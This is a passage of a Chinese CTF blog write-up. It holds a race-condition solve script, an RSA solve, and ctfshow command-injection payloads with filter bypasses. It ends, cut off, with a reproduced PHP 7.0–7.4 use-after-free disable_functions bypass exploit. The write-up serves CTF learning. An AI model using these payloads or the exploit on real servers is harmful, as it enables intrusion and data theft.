$phar-&gt;setStub(&#39;&lt;?php __HALT_COMPILER(); ? &gt;&#39;); &#x2F;&#x2F;固定的 $phar-&gt;setMetadata($a); $phar-&gt;addFromString(&quot;exp.txt&quot;, &quot;test&quot;); $phar-&gt;stopBuffering(); 然后是条件竞争， from time import sleep import requests import threading req &#x3D; requests.session() url1 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;uploads&#x2F;head.png&#39; url2 &#x3D; &#39;http:&#x2F;&#x2F;7ca1cf4f-a92c-4cf2-997c-d4c7c19f3f39.node4.buuoj.cn:81&#x2F;edit.php&#39; data1 &#x3D; &#123; &#39;png&#39;: &#39;phar:&#x2F;&#x2F;&#x2F;var&#x2F;www&#x2F;html&#x2F;uploads&#x2F;91fd0f2420aed857ed981856761afac6.png&#39;, &#39;flag&#39;: &#39;&#39; &#125; data2 &#x3D; &#123; &#39;png&#39;: &#39;&#x2F;tmp&#x2F;flag.txt&#39;, &#39;flag&#39;: &#39;&#39; &#125; def unlink(): req.post(url2, data1) def symlink(): req.post(url2, data2) if __name__ &#x3D;&#x3D; &quot;__main__&quot;: for _ in range(10): t1 &#x3D; threading.Thread(target&#x3D;unlink, args&#x3D;()) t2 &#x3D; threading.Thread(target&#x3D;symlink, args&#x3D;()) t1.start() t2.start() while True: # getflag flag &#x3D; req.get(url1).text if &quot;flag&quot; in flag: print(flag) break elif &#39;429&#39; in flag: sleep(5) print(&#39;wait!&#39;) 条件竞争这东西。。。感觉挺玄学的 warmup-javajava还没学，而且也没找到wp，先留个坑 cryptoeasy_real简单的rsa import random import hashlib flag &#x3D; &#39;xxxxxxxxxxxxxxxxxxxx&#39; key &#x3D; random.randint(1,10) for i in range(len(flag)): crypto +&#x3D; chr(ord(flag[i])^key) m &#x3D; crypto的ascii十六进制 e &#x3D; random.randint(1,100) print(hashlib.md5(e)) p &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319 q &#x3D; xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx n &#x3D; p*q c &#x3D; pow(m,e,n) print(n) print(c) #37693cfc748049e45d87b8c7d8b9aacd #4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523 #c&#x3D;3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397 已知p，n，c和e的md5值 爆破一下得到e=23 import hashlib for i in range(1,1000000000): res &#x3D; hashlib.md5(str(i).encode(&quot;utf-8&quot;)).hexdigest() if res &#x3D;&#x3D; &quot;37693cfc748049e45d87b8c7d8b9aacd&quot;: print(str(i)) print(res) c=3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397p=64310413306776406422334034047152581900365687374336418863191177338901198608319q=65267138038038699886916162739434586079731613825212388229424706115289974540917e=23 然后直接抄个rsa的脚本改改就行 import libnum from Crypto.Util.number import long_to_bytes c &#x3D; 3298176862697175389935722420143867000970906723110625484802850810634814647827572034913391972640399446415991848730984820839735665233943600223288991148186397 n &#x3D; 4197356622576696564490569060686240088884187113566430134461945130770906825187894394672841467350797015940721560434743086405821584185286177962353341322088523 # n &#x3D; int(&quot;&quot;,16) e &#x3D; 23 # e &#x3D; int(&quot;&quot;,16) q &#x3D; 64310413306776406422334034047152581900365687374336418863191177338901198608319 p &#x3D; 65267138038038699886916162739434586079731613825212388229424706115289974540917 d &#x3D; libnum.invmod(e, (p - 1) * (q - 1)) m &#x3D; pow(c, d, n) # m 的十进制形式 crypto &#x3D; long_to_bytes(m) # m明文 print(crypto.decode(&#39;utf-8&#39;)) # key &#x3D; random.randint(0,11) # for i in range(len(crypto)): # string +&#x3D; chr(ord(crypto[i])^key) for key in range(1,10): print(&#39;&#39;) for i in range(len(crypto)): print(chr(crypto[i]^key),end&#x3D;&#39;&#39;)","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"https://ethe448.github.io/tags/ctf/"}]},{"title":"ctfshow web","slug":"ctfshow-web","date":"2022-04-24T07:58:32.000Z","updated":"2022-05-01T09:22:34.393Z","comments":true,"path":"2022/04/24/ctfshow-web/","link":"","permalink":"https://ethe448.github.io/2022/04/24/ctfshow-web/","excerpt":"","text":"命令执行web29&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;system(ls); ?c&#x3D;system(&#39;cat f?ag.php&#39;);&#x2F;&#x2F;通配符直接绕 web30&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|system|php&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;echo &#96;ls&#96;; ?c&#x3D;echo &#96;cat f*&#96;;&#x2F;&#x2F;反引号内联执行 web31&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\\.| |\\&#39;&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;echo&#96;ls&#96;; ?c&#x3D;echo%09&#96;tac%09fla*&#96;;&#x2F;&#x2F;过滤了空格，但是可以用%09绕过 看hint感觉预期解应该是无参数的rce ?c&#x3D;readfile(array_rand(array_flip(scandir(current(localeconv()))))); ?c&#x3D;show_source(next(array_reverse(scandir(current(localeconv()))))); web32&lt;?php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|system|php|cat|sort|shell|\\.| |\\&#39;|\\&#96;|echo|\\;|\\(&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;include%0a$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php &#x2F;&#x2F;php的最后一行代码可以不用分号分行 c&#x3D;?&gt;&lt;?&#x3D;include$_GET[1]?&gt;&amp;1&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64- encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;用短标签再写段php也一样 php伪协议通常用于文件包含中，php中文件包含的函数有很多，比如 include include、require、include_once、require_once、highlight_file、show_source、file_get_contents、fopen、file、readfile 还可以用data伪协议 data伪协议就是把一些体量比较小的数据直接嵌入在页面里，而不使用外部链接。data:text/plain是嵌入文本 payload get传参 ?c&#x3D;include%0a$_POST[1]?&gt; post内容 1&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat flag*&#39;); 官方payload c&#x3D;$nice&#x3D;include$_GET[&quot;url&quot;]?&gt;&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64- encode&#x2F;resource&#x3D;flag.php&#x2F;&#x2F;感觉中间这个nice没啥用 web33同32 web34同32 web35同32 web36同32，就是注意不要用数字当参数名 web37&lt;?php &#x2F;&#x2F;flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 直接data伪协议读取 payload ?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;); web38&lt;?php &#x2F;&#x2F;flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag|php|file&#x2F;i&quot;, $c))&#123; include($c); echo $flag; &#125; &#125;else&#123; highlight_file(__FILE__); &#125; data伪协议加短标签 ?c&#x3D;data:text&#x2F;plain,&lt;?&#x3D;system(&#39;cat fla*&#39;); 至于利用日志文件的部分，不知道为什么只有用短标签的时候才能成功 首先用bp避免箭头符号的转义（这里也是只有作为c的值且用短标签的时候才会不转义，web37也一样 然后利用文件包含访问nginx的日志文件/var/log/nginx/access.log web39&lt;?php &#x2F;&#x2F;flag in flag.php error_reporting(0); if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;flag&#x2F;i&quot;, $c))&#123; include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 尖括号闭合掉后面的.php就行了 payload ?c&#x3D;data:text&#x2F;plain,&lt;?php system(&#39;cat fla*&#39;);?&gt; web40&lt;?php &#x2F;* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:03:36 # @email: h1xa@ctfer.com # @link: https:&#x2F;&#x2F;ctfer.com *&#x2F; if(isset($_GET[&#39;c&#39;]))&#123; $c &#x3D; $_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;[0-9]|\\~|\\&#96;|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\&#x3D;|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#39;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\&#x2F;|\\?|\\\\\\\\&#x2F;i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload 可以用无参数rce，因为这里过滤的是中文的括号 ?c&#x3D;show_source(next(array_reverse(scandir(pos(localeconv()))))); 或者利用session,但是 利用session_id()让php读取我们设置的cookie（session默认不使用所以加了session_start()让php开始使用session） 受php版本影响 5.5 -7.1.9均可以执行，因为session_id规定为0-9，a-z,A-Z,-中的字符。在5.5以下及7.1以上均无法写入除此之外的内容。但是符合要求的字符还是可以的 所以题目环境能做到的也就只有个ls和whoami之类的命令 本来还可以利用base64，但是题目把数字也过滤了，不能进行解码，只能用本地环境复现了 我这里直接贴了其他师傅的图片了 还有一种姿势 get_defined_vars() 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量。 array_pop() 是删除并返回数组最后一个元素 current() 返回数组中的当前元素的值。 next() 返回数组中的下一个元素的值。 我们用current()可以获取到GET数组，用next()可以获取到POST数组，然后用array_pop()取出POST数组里面的元素，最后用eval执行 web41或运算绕过，直接用羽师傅的脚本也行。 不过要是直接输payload要在bp里，应该是hackbar的编码有点问题 web42&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125;else&#123; highlight_file(__FILE__); &#125; &gt; 代表重定向到哪里/dev/null 代表空设备文件2&gt; 表示stderr标准错误&amp; 表示等同于的意思，2&gt;&amp;1，表示2的输出重定向等同于11 表示stdout标准输出，系统默认值是1，所以&gt;/dev/null等同于 1&gt;/dev/null因此，&gt;/dev/null 2&gt;&amp;1 也可以写成1&gt; /dev/null 2&gt; &amp;1 本题语句执行过程为：1&gt;/dev/null ：首先表示标准输出重定向到空设备文件，也就是不输出任何信息到终端，不显示任何信息。2&gt;&amp;1 ： 接着，标准错误输出重定向到标准输出，因为之前标准输出已经重定向到了空设备文件，所以标准错误输出也重定向到空设备文件。 补充：0表示键盘输入，1表示屏幕输出，2表示错误输出！‘ &gt; ’ 默认标准输出重定向，与1&gt;相同2&gt;&amp;1 意思是把标准错误输出重定向到标准输出&amp;&gt;file 意思是把标准输出和标准错误输出都重定向到文件file中 利用%0a换行把它换下去或者其他的语句来截断 ?c&#x3D;cat flag.php%0a ?c&#x3D;cat flag.php|| ?c&#x3D;cat flag.php%26 ?c&#x3D;cat flag.php%26%26 ?c&#x3D;cat flag.php; web43&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|cat&#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload基本上和42的一样，就是把cat换成uniq，tac，nl之类的 web44&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;;|cat|flag&#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; flag也被过滤了，那就在web43的基础上加上通配符 web45空格也被过滤了 &lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_matchd(&quot;&#x2F;\\;|cat|flag| &#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 用${IFS}替代空格 c&#x3D;nl$&#123;IFS&#125;f*|| web46&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|cat|flag| |[0-9]|\\\\$|\\*&#x2F;i&quot;, $c))&#123; system($c.&quot; &gt;&#x2F;dev&#x2F;null 2&gt;&amp;1&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; 用&lt;或&lt;&gt;代替空格，用‘’截断flag关键字 c&#x3D;nl&lt;&gt;fla&#39;&#39;g.php|| web47和46一样的 nl&lt;&gt;fla&#39;&#39;g.php|| web48同46 more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings web49同46 这个也行 ?c&#x3D;nl%09fl&quot;&quot;ag.php%0a web50同46 web51同46 web52过滤了大于小于，但是没过滤$符 ?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php|| web53&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\&#96;|\\%|\\x09|\\x26|\\&gt;|\\&lt;&#x2F;i&quot;, $c))&#123; echo($c); $d &#x3D; system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#39;no&#39;; &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;nl$&#123;IFS&#125;fla&#39;&#39;g.php web54&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\&#96;|\\%|\\x09|\\x26|\\&gt;|\\&lt;&#x2F;i&quot;, $c))&#123; system($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload ?c&#x3D;&#x2F;bin&#x2F;ca?$&#123;IFS&#125;f??????? 通配符绕过 web55&lt;?php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|[a-z]|\\&#96;|\\%|\\x09|\\x26|\\&gt;|\\&lt;&#x2F;i&quot;, $c))&#123; system($c); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; payload1 利用base64命令和通配符 c&#x3D;&#x2F;???&#x2F;????64 ????.??? payload2 p牛是真的厉害 https://www.leavesongs.com/PENETRATION/webshell-without-alphanum-advanced.html?page=1#reply-list 直接利用p牛博客里的这个 然后cat flag.php 有几率不成功，因为临时文件的文件名是随机的，如果没成功就是没大写，多试几次就行了 web56 另外这里如果是eval函数，那执行时还要加上?&gt;&lt;?= payload为 ?&gt;&lt;?&#x3D;&#96;. &#x2F;???&#x2F;????????[@-[]&#96;;?&gt; 原因是eval()函数相当于执行php的代码，而&lt;?= 就相当于&lt;?php echo 在PHP7以上不管short_open_tag配置是不是开启的。都可以使用。 所以就相当于一个新的PHP文件，这样的话就需要将最开始前面的&lt;?php给闭合，不然不会执行。 闭合之后就相当于 web57&lt;?php &#x2F;&#x2F; 还能炫的动吗？ &#x2F;&#x2F;flag in 36.php if(isset($_GET[&#39;c&#39;]))&#123; $c&#x3D;$_GET[&#39;c&#39;]; if(!preg_match(&quot;&#x2F;\\;|[a-z]|[0-9]|\\&#96;|\\|\\#|\\&#39;|\\&quot;|\\&#96;|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\&#x3D;|\\[&#x2F;i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__); &#125; $&#123;_&#125;:代表上一次命令执行的结果$(()): 做运算 之前没有命令返回或者执行,结果应该是空,与&quot;&quot;等价又 $((&quot;&quot;))值为0,$((~$((&quot;&quot;))))值为-1,再做拼接: payload $((~$(($((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;))))$((~$(($&#123;_&#125;)))))))) web58有一堆禁用函数 print_r(scandir(&#39;.&#39;));或者print_r(glob(&quot;*&quot;));读目录 扫目录找flag位置 print_r(scandir(&#39;./&#39;)); $a=opendir(&#39;./&#39;);while(($file = readdir($a)) !=false){echo $file.&quot; &quot;;} var_dump(scandir(&quot;/&quot;)); $a=new DirectoryIterator(&#39;glob:///*&#39;);foreach($a as $f){echo($f-&gt;__toString().&quot; &quot;);} c=print_r(file_get_contents(&#39;flag.php&#39;));或者readfile或者show_source或者highlight_file读文件 还可以更骚一点 POST c=include($_GET[&#39;url&#39;]); GET /?url=php://filter/read=convert.base64-encode/resource=flag.php 附一点读文件的方式 highlight_file($filename); show_source($filename); print_r(php_strip_whitespace($filename)); print_r(file_get_contents($filename)); readfile($filename); print_r(file($filename)); &#x2F;&#x2F; var_dump fread(fopen($filename,&quot;r&quot;), $size);&#x2F;&#x2F;print_r(fread(fopen(&quot;flag.php&quot;,&quot;r&quot;), filesize(&quot;flag.php&quot;))); include($filename); &#x2F;&#x2F; 非php代码 include_once($filename); &#x2F;&#x2F; 非php代码 require($filename); &#x2F;&#x2F; 非php代码 require_once($filename); &#x2F;&#x2F; 非php代码 伪协议读源码 print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size)); print_r(fgets(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 读取一行$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgets($a);echo $line;&#125; fpassthru(fopen($filename, &quot;r&quot;)); &#x2F;&#x2F; 从当前位置一直读取到 EOF print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));&#x2F;&#x2F;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line &#x3D; fgetcsv($a);var_dump($line);&#125; print_r(fgetss(fopen($filename, &quot;r&quot;))); &#x2F;&#x2F; 从文件指针中读取一行并过滤掉 HTML 标记 print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));&#x2F;&#x2F;c&#x3D;$a&#x3D;fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;print_r(fscanf($a,&quot;%s&quot;));&#125;; print_r(parse_ini_file($filename)); &#x2F;&#x2F; 失败时返回 false , 成功返回配置数组 web59file_get_contents和readfile没了，可以用其他俩 web60-65同web58，差不多就那几个函数，用show_source能全过 web66c&#x3D;print_r(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;); web67print_r禁了 用var_dump c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));highlight_file(&quot;&#x2F;flag.txt&quot;); web68c&#x3D;var_dump(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;) 看根目录，然后直接include包含 web69var_dump也没了，但是还有var_export c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;); y4师傅还有一个用php的原生类遍历目录的骚操作 c&#x3D;$a&#x3D;new DirectoryIterator(&#39;glob:&#x2F;&#x2F;&#x2F;*&#39;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125; 然后包含这个我文件 c&#x3D;include(&#39;&#x2F;flag.txt&#39;); c&#x3D;require(&#39;&#x2F;flag.txt&#39;); c&#x3D;require_once(&#39;&#x2F;flag.txt&#39;); web70同69 web71&lt;?php error_reporting(0); ini_set(&#39;display_errors&#39;, 0); &#x2F;&#x2F; 你们在炫技吗？ if(isset($_POST[&#39;c&#39;]))&#123; $c&#x3D; $_POST[&#39;c&#39;]; eval($c); $s &#x3D; ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;&#x2F;[0-9]|[a-z]&#x2F;i&quot;,&quot;?&quot;,$s); &#125;else&#123; highlight_file(__FILE__); &#125; ?&gt; ob_get_contents — 返回输出缓冲区的内容ob_end_clean — 清空（擦除）缓冲区并关闭输出缓冲 此函数丢弃最顶层输出缓冲区的内容并关闭这个缓冲区。如果想要进一步处理缓冲区的内容，必须在ob_end_clean()之前调用ob_get_contents()，因为当调用ob_end_clean()时缓冲区内容将被丢弃 要用exit();使程序提前退出，绕过后面的正则表达式 c&#x3D;var_export(scandir(&#39;&#x2F;&#39;));include(&quot;&#x2F;flag.txt&quot;);exit(); web72scandir被禁用了 用y4师傅的那个原生类来查目录，但是文件没有权限被包含 y4师傅推荐的脚本 &lt;?php # PHP 7.0-7.4 disable_functions bypass PoC (*nix only) # # Bug: https:&#x2F;&#x2F;bugs.php.net&#x2F;bug.php?id&#x3D;76047 # debug_backtrace() returns a reference to a variable # that has been destroyed, causing a UAF vulnerability. # # This exploit should work on all PHP 7.0-7.4 versions # released as of 30&#x2F;01&#x2F;2020. # # Author: https:&#x2F;&#x2F;github.com&#x2F;mm0r1 pwn(&quot;uname -a&quot;); function pwn($cmd) &#123; global $abc, $helper, $backtrace; class Vuln &#123; public $a; public function __destruct() &#123; global $backtrace; unset($this-&gt;a); $backtrace &#x3D; (new Exception)-&gt;getTrace(); # ;) if(!isset($backtrace[1][&#39;args&#39;])) &#123; # PHP &gt;&#x3D; 7.4 $backtrace &#x3D; debug_backtrace(); &#125; &#125; &#125; class Helper &#123; public $a, $b, $c, $d; &#125; function str2ptr(&amp;$str, $p &#x3D; 0, $s &#x3D; 8) &#123; $address &#x3D; 0; for($j &#x3D; $s-1; $j &gt;&#x3D; 0; $j--) &#123; $address &lt;&lt;&#x3D; 8; $address |&#x3D; ord($str[$p+$j]); &#125; return $address; &#125; function ptr2str($ptr, $m &#x3D; 8) &#123; $out &#x3D; &quot;&quot;; for ($i&#x3D;0; $i &lt; $m; $i++) &#123; $out .&#x3D; chr($ptr &amp; 0xff); $ptr &gt;&gt;&#x3D; 8; &#125; return $out; &#125; function write(&amp;$str, $p, $v, $n &#x3D; 8) &#123; $i &#x3D; 0; for($i &#x3D; 0; $i &lt; $n; $i++) &#123; $str[$p + $i] &#x3D; chr($v &amp; 0xff); $v &gt;&gt;&#x3D; 8; &#125; &#125; function leak($addr, $p &#x3D; 0, $s &#x3D; 8) &#123; global $abc, $helper; write($abc, 0x68, $addr + $p - 0x10); $leak &#x3D; strlen($helper-&gt;a); if($s !&#x3D; 8) &#123; $leak %&#x3D; 2 &lt;&lt; ($s * 8) - 1; &#125; return $leak; &#125; function parse_elf($base) &#123; $e_type &#x3D; leak($base, 0x10, 2); $e_phoff &#x3D; leak($base, 0x20); $e_phentsize &#x3D; leak($base, 0x36, 2); $e_phnum &#x3D; leak($base, 0x38, 2); for($i &#x3D; 0; $i &lt; $e_phnum; $i++) &#123; $header &#x3D; $base + $e_phoff + $i * $e_phentsize; $p_type &#x3D; leak($header, 0, 4); $p_flags &#x3D; leak($header, 4, 4); $p_vaddr &#x3D; leak($header, 0x10); $p_memsz &#x3D; leak($header, 0x28); if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 6) &#123; # PT_LOAD, PF_Read_Write # handle pie $data_addr &#x3D; $e_type &#x3D;&#x3D; 2 ? $p_vaddr : $base + $p_vaddr; $data_size &#x3D; $p_memsz; &#125; else if($p_type &#x3D;&#x3D; 1 &amp;&amp; $p_flags &#x3D;&#x3D; 5) &#123; # PT_LOAD, PF_Read_exec $text_size &#x3D; $p_memsz; &#125; &#125; if(!$data_addr || !$text_size || !$data_size) return false; return [$data_addr, $text_size, $data_size]; &#125; function get_basic_funcs($base, $elf) &#123; list($data_addr, $text_size, $data_size) &#x3D; $elf; for($i &#x3D; 0; $i &lt; $data_size &#x2F; 8; $i++) &#123; $leak &#x3D; leak($data_addr, $i * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;constant&#39; constant check if($deref !&#x3D; 0x746e6174736e6f63) continue; &#125; else continue; $leak &#x3D; leak($data_addr, ($i + 4) * 8); if($leak - $base &gt; 0 &amp;&amp; $leak - $base &lt; $data_addr - $base) &#123; $deref &#x3D; leak($leak); # &#39;bin2hex&#39; constant check if($deref !&#x3D; 0x786568326e6962) continue; &#125; else continue; return $data_addr + $i * 8; &#125; &#125; function get_binary_base($binary_leak) &#123; $base &#x3D; 0; $start &#x3D; $binary_leak &amp; 0xfffffffffffff000; for($i &#x3D; 0; $i &lt; 0x1000; $i++) &#123; $addr &#x3D; $start - 0x1000 * $i; $leak &#x3D; leak($addr, 0, 7); if($leak &#x3D;&#x3D; 0x10102464c457f) &#123; # ELF header return $addr; &#125; &#125; &#125; function get_system($basic_funcs) &#123; $addr &#x3D; $basic_funcs; do &#123; $f_entry &#x3D; leak($addr); $f_name &#x3D; leak($f_entry, 0, 6); if($f_name &#x3D;&#x3D; 0x6d6574737973) &#123; # system return leak($addr + 8); &#125; $addr +&#x3D; 0x20; &#125; while($f_entry !&#x3D; 0); return false; &#125; function trigger_uaf($arg) &#123; # str_shuffle prevents opcache string interning $arg &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); $vuln &#x3D; new Vuln(); $vuln-&gt;a &#x3D; $arg; &#125; if(stristr(PHP_OS, &#39;WIN&#39;)) &#123; die(&#39;This PoC is for *nix systems only.&#39;); &#125; $n_alloc &#x3D; 10; # increase this value if UAF fails $contiguous &#x3D; []; for($i &#x3D; 0; $i &lt; $n_alloc; $i++) $contiguous[] &#x3D; str_shuffle(str_repeat(&#39;A&#39;, 79)); trigger_uaf(&#39;x&#39;); $abc &#x3D; $backtrace[1][&#39;args&#39;][0]; $helper &#x3D; new Helper; $helper-&gt;b &#x3D; function ($x) &#123; &#125;; if(strlen($abc) &#x3D;&#x3D; 79 || strlen($abc) &#x3D;&#x3D; 0) &#123; die(&quot;UAF failed&quot;); &#125; # leaks $closure_handlers &#x3D; str2ptr($abc, 0); $php_heap &#x3D; str2ptr($abc, 0x58); $abc_addr &#x3D; $php_heap - 0xc8; # fake value write($abc, 0x60, 2); write($abc, 0x70, 6); # fake reference write($abc, 0x10, $abc_addr + 0x60); write($abc, 0x18, 0xa); $closure_obj &#x3D; str2ptr($abc, 0x20); $binary_leak &#x3D; leak($closure_handlers, 8); if(!($base &#x3D; get_binary_base($binary_leak))) &#123; die(&quot;Couldn&#39;t determine binary base address&quot;); &#125; if(!($elf &#x3D; parse_elf($base))) &#123; 